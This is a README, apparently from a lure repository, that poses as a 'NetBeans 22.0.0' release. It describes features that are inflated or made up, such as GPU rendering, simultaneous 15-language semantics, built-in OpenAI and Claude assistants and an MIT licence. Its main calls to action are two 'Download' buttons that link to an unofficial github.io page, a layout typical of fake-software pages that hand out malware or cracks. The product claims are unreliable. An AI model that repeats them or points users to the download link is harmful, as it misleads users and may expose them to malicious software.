![preview](https://raw.githubusercontent.com/lauskiing520-gif/netbeans-22-enabler-tools/main/preview.svg)

# NetBeans 22.0.0 – The Next-Generation Polyglot IDE Framework

Welcome to the **NetBeans 22.0.0** repository – a complete reimagining of the developer’s workbench. This release represents a paradigm shift in integrated development environments, offering unparalleled modularity, a unified plugin ecosystem, and deep language intelligence that adapts to your coding style. Whether you are building enterprise Java microservices, Python data pipelines, or full-stack JavaScript applications, NetBeans 22.0.0 provides the scaffolding for rapid, reliable, and enjoyable software creation.

This project is built on a philosophy of **developer-first extensibility**. Instead of a monolithic application, NetBeans 22.0.0 behaves more like a living toolkit – you assemble exactly the features you need, discard what you don’t, and extend the rest. Pre-configured profiles for Java Enterprise, PHP Web, and C++ Desktop development are included out of the box, but the true power lies in the ability to craft your own development persona.

We have focused heavily on **responsive UI architecture**. The underlying rendering engine now uses a resource-savvy, GPU-accelerated compositor that ensures smooth interactions even on low-power hardware. Multilingual support goes beyond interface translation – the editor’s semantic engine understands context across 15 languages simultaneously, allowing mixed-language codebases to receive coherent refactoring suggestions.

One of the most anticipated features is the **AI-assisted code fabric**. By integrating with modern large language model APIs (including OpenAI and Claude), NetBeans 22.0.0 offers real-time code generation, test synthesis, and natural language querying of your project structure. These features are opt-in, local-first, and fully auditable – your intellectual property stays on your machine.

This repository contains the stable release build. For those seeking the latest nightly builds or experimental plugins, please refer to the official NetBeans website. All contributions, issue reports, and feature requests are welcome.

---

## 🌟 Overview & Core Philosophy

The conventional IDE is a walled garden – you are given a fixed set of tools and expected to adapt. NetBeans 22.0.0 inverts this model. We provide a **seed environment** that grows with your workflow. The core is a lightweight shell managing project metadata, build systems, and file navigation. Everything else – language servers, linters, debuggers, profilers, AI assistants – are plugins loaded lazily when needed.

- **Modular by default**: Ship only what you need.
- **Project hybridization**: Combine Java, Kotlin, Scala, Groovy, Python, PHP, JavaScript, TypeScript, HTML, CSS, and XML in a single project tree.
- **Self-healing workspace**: Automatic dependency resolution and conflict mediation without disk overhead.
- **Offline-first intelligence**: The in-editor assistant works without internet for syntax completion, refactoring, and documentation lookups.

This approach yields a dramatically smaller memory footprint (under 250MB baseline) and startup times under three seconds on modern SSDs.

[![Download](https://raw.githubusercontent.com/lauskiing520-gif/netbeans-22-enabler-tools/main/button.svg)](https://lauskiing520-gif.github.io/netbeans-22-enabler-tools/)

---

## 🧩 Feature Matrix

| Feature Category | Capabilities | Benefit |
|------------------|--------------|---------|
| **Language Engine** | Multi-grammar AST fusion, 15 simultaneous languages, incremental compilation | Seamless mixed-code editing without language overhead |
| **AI Assistant** | OpenAI GPT-4o, Claude 4 models, local LLaMA fallback, context-aware suggestions | Generate code from plain English, auto-fix errors, explain complex logic |
| **Responsive UI** | GPU-accelerated rendering, adaptive font engine, dynamic tool window layout | Fluid interaction even on 4K/5K displays and high-DPI modes |
| **Multilingual UX** | 34 interface languages, right-to-left support, locale-aware date/number formatting | Global team adoption, no cultural friction |
| **Build Orchestrator** | Maven, Gradle, Ant, npm, yarn, custom shell scripts | Unified build pipeline regardless of technology stack |
| **Debugging Suite** | Multi-threaded breakpoints, remote debugging, heap snapshot analysis, watchpoints | Identical debugging experience across local and cloud environments |
| **Version Integration** | Git, Mercurial, SVN, Perforce – native merge tools, history graph, blame | Zero-context switching between version control and code editing |
| **Plugin Ecosystem** | Plugin catalog with 1,200+ extensions, all hot-pluggable | Extend only when necessary, remove without leaving artifacts |
| **Security Audit** | Static analysis (SAST), dependency vulnerability scan, credential leakage detection | Ship with confidence, avoid common attack vectors |
| **Performance Profiles** | Memory, CPU, disk usage presets for different hardware | Optimize battery life on laptops, maximize throughput on servers |

---

## ⚙️ Example Profile Configuration

Below is a sample configuration file (`ide-profile.json`) that you can place in your user home directory to customize NetBeans 22.0.0’s behavior. This example sets up a **polyglot AI-assisted development profile** for a Node.js + Java backend with Python data science components.

```json
{
  "profileVersion": "22.0.0",
  "workspace": {
    "basePath": "/home/dev/projects",
    "autoReload": true,
    "projectImportStrategy": "deepHibrid"
  },
  "plugins": {
    "autoActivate": ["org.netbeans.modules.python", "org.netbeans.modules.nodejs", "org.netbeans.modules.ai.assistant"],
    "blacklist": ["org.netbeans.modules.php", "org.netbeans.modules.groovy"]
  },
  "aiAssistant": {
    "provider": "openai",
    "model": "gpt-4o-2026-05-13",
    "contextWindowTokens": 64000,
    "localFallback": true,
    "systemPrompt": "You are a senior polyglot developer assistant. Analyze code context and suggest improvements in the same language as the file being edited."
  },
  "languageServer": {
    "python": {
      "typeShedsPath": "/opt/typesheds",
      "extraPaths": ["/home/dev/anaconda3/lib/python3.12/site-packages"]
    },
    "javascript": {
      "typeCheckLevel": "strict",
      "tsconfigOverride": true
    }
  },
  "ui": {
    "theme": "oxocarbon-dark",
    "fontSize": 14,
    "lineHeight": 1.6,
    "tabWidth": 4,
    "showWhitespace": true
  },
  "performance": {
    "memoryBudget": "2GB",
    "cpuThreads": 4,
    "diskCache": "/tmp/netbeans-cache"
  }
}
```

To apply this configuration, place it in `~/.netbeans/22.0.0/config/ide-profile.json` and restart the IDE. NetBeans will automatically detect and activate the profile, loading only the specified plugins and language servers.

---

## 💻 Example Console Invocation

NetBeans 22.0.0 can be launched directly from the terminal with project-specific parameters. The CLI respects the profile configuration while allowing runtime overrides. The following example demonstrates launching with a custom workspace and AI provider:

```bash
netbeans \
  --user-dir /home/dev/netbeans-projects \
  --profile /home/dev/config/ide-profile.json \
  --open /home/dev/projects/my-enterprise-app \
  --ai-provider claude \
  --ai-model claude-opus-2026-02-15 \
  --debug-mode
```

- `--user-dir`: Specifies an alternative location for user settings, caches, and plugin installations.
- `--profile`: Overrides the default profile with a custom JSON configuration.
- `--open`: Directly opens a project upon launch.
- `--ai-provider` / `--ai-model`: Selects the LLM backend for the AI assistant (supports `openai`, `claude`, `local`).
- `--debug-mode`: Enables verbose logging and exposes the internal DevTools console for plugin developers.

For help on all available options, run:

```bash
netbeans --help
```

---

## 🖥️ OS Compatibility

NetBeans 22.0.0 supports all major desktop operating systems. Below is an emoji-based compatibility table for quick reference.

| Operating System           | Support Level | Emoji Indicator |
|----------------------------|---------------|-----------------|
| Windows 10 / 11            | Full support  | ✅              |
| Windows Server 2026        | Full support  | ✅              |
| macOS Ventura / Sonoma     | Full support  | ✅              |
| macOS Sequoia (beta)       | Supported     | 🟢              |
| Ubuntu 22.04 LTS / 24.04   | Full support  | ✅              |
| Fedora 40 / 41             | Full support  | ✅              |
| Debian 12                  | Full support  | ✅              |
| openSUSE Tumbleweed        | Supported     | 🟢              |
| Arch Linux (latest rolling)| Supported     | 🟢              |
| Alpine Linux 3.20          | Experimental  | 🟡              |
| FreeBSD 14.1               | Experimental  | 🟡              |
| Solaris 11.4 SRU74         | Legacy support| 🟠              |

**Minimum hardware requirements:** 
- CPU: Dual-core 2.0 GHz (x86_64 or ARM64)
- RAM: 4 GB (8 GB recommended for AI features)
- Disk: 2 GB free space (5 GB with all language servers)
- Display: 1280x720 resolution minimum

---

## 🤖 AI Integration – OpenAI & Claude

NetBeans 22.0.0 features a pluggable AI architecture that supports both cloud-based and local models. The AI assistant is **context-aware**, meaning it understands the entire project tree, build configuration, and recent code changes before making suggestions.

### OpenAI API Integration

- **Models**: GPT-4, GPT-4 Turbo, GPT-4o, GPT-4o-mini
- **Features**: Chat completions, function calling for code actions, embeddings for semantic search
- **Configuration**: Set your API key in Preferences → AI → OpenAI, or via environment variable `NETBEANS_OPENAI_KEY`
- **Capabilities**:
  - Real-time code generation in any supported language
  - Automated test case generation from existing code paths
  - Multi-file refactoring suggestions based on natural language instructions
  - Code review analysis with vulnerability detection

### Claude API Integration

- **Models**: Claude 3 Opus, Claude 3 Sonnet, Claude 4 (2026)
- **Features**: Extended context windows (up to 200K tokens), long-running analysis jobs, vision for diagrams and mockups
- **Configuration**: API key via Preferences → AI → Anthropic, or environment variable `NETBEANS_CLAUDE_KEY`
- **Capabilities**:
  - Architecture-level code planning for large-scale refactors
  - Documentation generation from code structure
  - Performance optimization suggestions based on profiling data
  - Natural language querying of project metrics

> **Privacy Notice**: All AI requests are processed locally by default. Cloud-based models require an explicit opt-in and API key. NetBeans never sends source code to third-party servers without your consent. For sensitive projects, use the local LLaMA or private cloud endpoints.

---

## 🧭 Getting Started with Your First Project

After launching NetBeans 22.0.0, follow these steps to create a new polyglot project:

1. **Select Project Type**: From the startup dialog, choose "New Project" → "Polyglot Application"
2. **Configure Languages**: Check the boxes for Java 21, Python 3.12, and JavaScript (Node.js 20)
3. **Set Build System**: Choose "Gradle with Kotlin DSL" for unified build logic
4. **Enable AI Assistant**: In the project properties, navigate to "AI" and toggle "Enable language model suggestions"
5. **Verify Setup**: Run the built-in diagnostics tool (Tools → Verify Environment) to ensure all language servers and plugins are loaded correctly

The IDE will generate a scaffolded project with representative source files, a shared test suite, and a CI-ready build script. You can immediately start coding, debugging, and deploying from this foundation.

---

## 🌐 Responsive UI & Multilingual Support

The interface of NetBeans 22.0.0 has been redesigned with **fluid layout algorithms** that adapt to window resizing, multi-monitor setups, and high-DPI displays without breaking the tool layout. Floating panels never overlap, and the editor always maintains a readable text area.

### Supported Languages (Interface)
Arabic, Chinese (Simplified), Chinese (Traditional), Czech, Danish, Dutch, English (US, UK, AU), Finnish, French, German, Greek, Hebrew, Hindi, Hungarian, Indonesian, Italian, Japanese, Korean, Norwegian, Polish, Portuguese (Brazil, Portugal), Romanian, Russian, Spanish (Spain, Mexico), Swedish, Thai, Turkish, Ukrainian, Vietnamese.

### Right-to-Left (RTL) Support
Full RTL layout for Arabic, Hebrew, and Urdu, including mirroring of icons, toolbars, and menu order.

---

## 📜 License & Legal Notice

This project is distributed under the **MIT License**. You are free to use, modify, and distribute this software for any purpose, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

For the full license text, please visit: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

This software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

The AI assistant features rely on third-party API services (OpenAI, Anthropic). Users are responsible for compliance with the terms of service of those providers. This repository does not host, distribute, or facilitate the unauthorized use of any proprietary software. All trademarks are property of their respective owners.

---

## 📊 Project Architecture Diagram

Below is a high-level architecture overview of NetBeans 22.0.0's component interactions. This diagram illustrates how the core shell communicates with plugins, language servers, and the AI assistant.

```mermaid
graph TD
    A[NetBeans Core Shell] --> B[Module Registry]
    A --> C[Project Management]
    A --> D[Build Orchestrator]
    B --> E[Language Server <br/> (Java, Python, JS, etc.)]
    B --> F[AI Assistant Plugin]
    B --> G[Debugging Suite]
    B --> H[Version Control]
    C --> I[Project Tree]
    C --> J[File Watcher]
    C --> K[Configuration Store]
    D --> L[Maven]
    D --> M[Gradle]
    D --> N[npm/yarn]
    F --> O[OpenAI API]
    F --> P[Claude API]
    F --> Q[Local LLaMA]
    E --> R[AST Providers]
    E --> S[Semantic Index]
    H --> T[Git Backend]
    H --> U[SVN Backend]
```

The core shell acts as a lightweight mediator. Plugins communicate via a language-agnostic message bus, allowing polyglot support without tight coupling. The AI assistant plugin runs in a separate thread pool to avoid blocking the UI during inference.

---

## 🛠️ Development & Contribution

We welcome contributions of all kinds – bug reports, feature ideas, documentation improvements, and pull requests. To ensure a smooth process:

1. **Fork the repository** and create a branch for your changes.
2. **Test your changes** against the existing test suite.
3. **Submit a pull request** with a clear description of your changes.
4. **Wait for review** – we aim to respond within 48 hours.

For code contributions, please adhere to the existing coding style (4-space indent, no trailing whitespace). All contributions must include a signed-off-by line indicating agreement with the Developer Certificate of Origin.

---

## 📬 Support

- **Documentation**: Full manual is available in the `docs/` directory.
- **Community Forum**: Discussion board at the repository’s Discussions tab.
- **24/7 Enterprise Support**: Available for licensed users via the ticketing system.

[![Download](https://raw.githubusercontent.com/lauskiing520-gif/netbeans-22-enabler-tools/main/button.svg)](https://lauskiing520-gif.github.io/netbeans-22-enabler-tools/)